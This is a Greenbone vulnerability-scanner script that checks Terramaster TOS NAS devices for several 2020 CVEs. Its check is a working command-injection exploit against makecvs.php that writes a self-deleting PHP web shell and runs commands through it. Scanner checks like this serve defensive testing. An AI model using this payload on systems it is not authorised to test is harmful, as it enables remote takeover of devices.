CPE = "cpe:/a:noontec:terramaster";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.145118" );
	script_version( "2021-08-26T06:01:00+0000" );
	script_tag( name: "last_modification", value: "2021-08-26 06:01:00 +0000 (Thu, 26 Aug 2021)" );
	script_tag( name: "creation_date", value: "2021-01-12 04:24:25 +0000 (Tue, 12 Jan 2021)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2020-12-28 15:56:00 +0000 (Mon, 28 Dec 2020)" );
	script_cve_id( "CVE-2020-28184", "CVE-2020-28185", "CVE-2020-28186", "CVE-2020-28187", "CVE-2020-28188", "CVE-2020-29189", "CVE-2020-28190", "CVE-2020-35665" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Terramaster TOS < 4.2.07 Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2021 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_terramaster_nas_detect.sc" );
	script_mandatory_keys( "terramaster_nas/detected" );
	script_tag( name: "summary", value: "Terramaster TOS is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "The following vulnerabilities exist:

  - Cross-site scripting (CVE-2020-28184)

  - User enumeration (CVE-2020-28185)

  - Email injection (CVE-2020-28186)

  - Multiple directory traversals (CVE-2020-28187)

  - Remote command execution (CVE-2020-28188)

  - Incorrect access control (CVE-2020-29189)

  - Insecure update channel (CVE-2020-28190)

  - Unauthenticated command execution (CVE-2020-35665)" );
	script_tag( name: "affected", value: "Terramaster TOS 4.2.06 and prior." );
	script_tag( name: "solution", value: "Update to version 4.2.07 or later." );
	script_xref( name: "URL", value: "https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
cmds = exploit_commands( "linux" );
for pattern in keys( cmds ) {
	vtstrings = get_vt_strings();
	filename = vtstrings["default_rand"] + ".php";
	payload = "http|echo \"<?php system(" + "'" + cmds[pattern] + "'" + "); unlink(__FILE__); ?>\" > /usr/www/" + filename + " && chmod +x /usr/www/" + filename + "||";
	url = "/include/makecvs.php?Event=" + payload;
	req = http_get( port: port, item: url );
	res = http_keepalive_send_recv( port: port, data: req );
	req = http_get( port: port, item: "/" + filename );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(egrep( pattern: pattern, string: res )){
		report = "It was possible to execute the \"" + cmds[pattern] + "\" command.\n\nResult:\n\n" + res;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

